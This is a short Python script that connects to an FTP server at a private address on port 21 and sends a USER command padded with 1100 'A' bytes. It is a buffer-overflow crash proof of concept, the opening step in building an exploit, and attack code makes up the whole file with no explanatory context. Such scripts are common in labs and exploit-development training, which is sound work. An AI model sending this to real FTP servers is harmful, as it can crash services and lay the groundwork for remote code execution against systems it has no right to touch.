#!/usr/bin/python
import socket

buf =(b'A'*1100)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.50.102", 21))
s.send(b"USER " + buf + b"\r\n")
